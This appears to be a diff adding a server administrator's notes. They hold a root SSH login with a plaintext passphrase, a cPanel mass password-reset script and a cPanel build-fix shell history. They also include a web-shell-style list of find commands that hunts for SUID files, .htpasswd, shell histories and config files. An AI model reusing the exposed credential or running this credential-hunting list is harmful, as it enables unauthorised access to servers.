+ssh -i .ssh/host.frekansweb.com.key root@209.59.132.34
+
+Passphrase: 7QG7l&%S)f5F
+
+## check DNS cache poisoning
+
+run within server
+
+dig +short @ns1.logicintel.com porttest.dns-oarc.net TXT
+
+ns1.logicintel.com is the TLD nameserver
+
+## mass change passwords
+
+#!/bin/bash
+
+output="/root/newpasswords"
+
+cp -rvp /etc/passwd{,.bak.`date +%s`}
+
+cp -rvp /etc/shadow{,.bak.`date +%s`}
+
+function randpass() {
+
+[ "$2" == "0" ] && CHAR="[:alnum:]" || CHAR="[:graph:]"
+
+cat /dev/urandom | tr -cd "$CHAR" | head -c ${1:-32}
+
+echo
+
+}
+
+echo "cPanel Users:"
+
+users=`cat /etc/trueuserdomains | cut -d: -f2 | sort`
+
+for user in $users
+
+do
+
+echo " $user"
+
+pass=$(randpass 10)
+
+echo "$user $pass" >> $output
+
+echo $pass | passwd --stdin "$user"
+
+done
+
+echo
+
+echo
+
+
+'find suid files'=>'find / -type f -perm -04000 -ls',
+
+'find suid files in current dir'=>'find . -type f -perm -04000 -ls',
+
+'find sgid files'=>'find / -type f -perm -02000 -ls',
+
+'find sgid files in current dir'=>'find . -type f -perm -02000 -ls',
+
+'find config.inc.php files'=>'find / -type f -name config.inc.php',
+
+'find config.inc.php files in current dir'=>'find . -type f -name config.inc.php',
+
+'find config* files'=>'find / -type f -name "config*"',
+
+'find config* files in current dir'=>'find . -type f -name "config*"',
+
+'find all writable files'=>'find / -type f -perm -2 -ls',
+
+'find all writable files in current dir'=>'find . -type f -perm -2 -ls',
+
+'find all writable directories'=>'find / -type d -perm -2 -ls',
+
+'find all writable directories in current dir'=>'find . -type d -perm -2 -ls',
+
+'find all writable directories and files'=>'find / -perm -2 -ls',
+
+'find all writable directories and files in current dir'=>'find . -perm -2 -ls',
+
+'find all service.pwd files'=>'find / -type f -name service.pwd',
+
+'find service.pwd files in current dir'=>'find . -type f -name service.pwd',
+
+'find all .htpasswd files'=>'find / -type f -name .htpasswd',
+
+'find .htpasswd files in current dir'=>'find . -type f -name .htpasswd',
+
+'find all .bash_history files'=>'find / -type f -name .bash_history',
+
+'find .bash_history files in current dir'=>'find . -type f -name .bash_history',
+
+'find all .mysql_history files'=>'find / -type f -name .mysql_history',
+
+'find .mysql_history files in current dir'=>'find . -type f -name .mysql_history',
+
+'find all .fetchmailrc files'=>'find / -type f -name .fetchmailrc',
+
+'find .fetchmailrc files in current dir'=>'find . -type f -name .fetchmailrc',
+
+'list file attributes on a Linux second extended file system'=>'lsattr -va',
+
+'show opened ports'=>'netstat -an | grep -i listen',
+
+
+# cPanel fix on libxml2 failed at gzopen64
+
+ 911  20120910 - 11:52:12 - objdump -T /usr/lib/libz.so* | grep gzopen64
+
+ 912  20120910 - 11:55:14 - objdump -T `locate libz.so` | grep gzopen64
+
+ 913  20120910 - 11:55:41 - locate libz.so
+
+ 914  20120910 - 11:56:25 - objdump -T /usr/local/lib/libz.so.1.2.7 | grep gzopen64
+
+ 915  20120910 - 12:04:13 - cat /proc/cpuinfo
+
+ 916  20120910 - 12:04:40 - cat /etc/redhat-release
+
+ 917  20120910 - 12:06:54 - mv -v /home/cpeasyapache{,.bak}
+
+ 918  20120910 - 12:07:03 - /scripts/easyapache
+
+ 919  20120910 - 12:25:51 - exit
+
+ 920  20120910 - 10:37:40 - screen
+
+ 921  20120911 - 10:28:54 - /scripts/upcp
+
+ 922  20120911 - 10:28:54 - /scripts/upcp --force
+
+ 923  20120910 - 14:03:16 - ls -alh /usr/bin/ld
+
+ 924  20120910 - 14:03:25 - chmod 755 /usr/bin/ld
+
+ 925  20120910 - 14:03:33 - screen -AU -h 200000
+
+ 926  20120910 - 14:21:20 - /scripts/easyapache
+
+ 927  20120911 - 10:28:54 - /scripts/easyapache
+
+ 928  20120911 - 10:28:54 - which mak
+
+ 929  20120911 - 10:28:54 - which make
+
+ 930  20120911 - 10:28:54 - ls -lah /usr/bin/make
+
+ 931  20120911 - 10:28:54 - rm -rm /home/cpeasyapache/src/libxml2-2.7.8/
+
+ 932  20120911 - 10:28:54 - rm -rmf /home/cpeasyapache/src/libxml2-2.7.8/
+
+ 933  20120911 - 10:28:54 - rm -rf /home/cpeasyapache/src/libxml2-2.7.8/
+
+ 934  20120911 - 10:28:54 - /scripts/easyapache --build
+
+ 935  20120911 - 10:28:54 - /scripts/easyapache
+
+ 936  20120911 - 10:28:54 - /scripts/easyapache
+
+ 937  20120911 - 10:28:54 - /scripts/easyapache
+
+ 938  20120911 - 10:28:54 - /scripts/easyapache
+
+ 939  20120911 - 10:28:54 - yum list | grep -i xml
+
+ 940  20120911 - 10:28:54 - /scripts/easyapache --skip-rawopts
+
+ 941  20120911 - 10:28:54 - /scripts/easyapache --help
+
+ 942  20120911 - 10:28:54 - /scripts/easyapache   --skip-rawopts   --skip-rawenv  --skip-hooks  --skip-custom-optmods
+
+ 943  20120911 - 10:28:54 - yum list | grep zlib
+
+ 944  20120911 - 10:28:54 - yum update zlib
+
+ 945  20120911 - 10:28:54 - yum whatprovides gzopen64
+
+ 946  20120911 - 10:28:54 - ls -lah /usr/local/include
+
+ 947  20120911 - 10:28:54 - date
+
+ 948  20120911 - 10:28:54 - mkdir ~/cpkeiths/
+
+ 949  20120911 - 10:28:54 - cp /usr/local/include/z* ~/cpkeiths/
+
+ 950  20120911 - 10:28:54 - /scripts/easyapache --build
+
+ 951  20120911 - 10:28:54 - ls -lah /usr/local/include
+
+ 952  20120911 - 10:28:54 - ls -lah /usr/local/lib/libz.
+
+ 953  20120911 - 10:28:54 - [Hmv /usr/local/include/z* ~/cpkeiths/
+
+ 954  20120911 - 10:28:54 - /scripts/easyapache --build
+
+ 955  20120911 - 10:28:54 - vi +31 -c 'set nu' /usr/local/apache/conf/modsec/00_asl_whitelist.conf
+
+ 956  20120911 - 10:28:54 - /scripts/easyapache --build
+
+ 957  20120911 - 10:28:54 - ls -lah /usr/local/include
+
+ 958  20120911 - 10:28:54 - vi +31 -c 'set nu' /usr/local/apache/conf/modsec/00_asl_whitelist.conf
+
+ 959  20120911 - 10:28:54 - /scripts/restartsrv_httpd
+
+ 960  20120911 - 10:28:54 - ps axfwwwu
+
+ 961  20120911 - 10:28:54 - vi +31 -c 'set nu' /usr/local/apache/conf/modsec/00_asl_whitelist.conf
+
+ 962  20120911 - 10:28:54 - /scripts/restartsrv_httpd
+
+ 963  20120911 - 10:28:54 - ps axfwwwu | grep http
+
+ 964  20120911 - 10:28:54 - vi +31 -c 'set nu' /usr/local/apache/conf/modsec/00_asl_whitelist.conf
+
+ 965  20120911 - 10:28:54 - /scripts/easyapache --build
+
+ 966  20120911 - 10:28:54 - vi +31 -c 'set nu' /usr/local/apache/conf/modsec/00_asl_whitelist.conf
+
+ 967  20120911 - 10:28:54 - /scripts/easyapache --build
+
+ 968  20120910 - 14:51:44 - screen -AU -h 200000
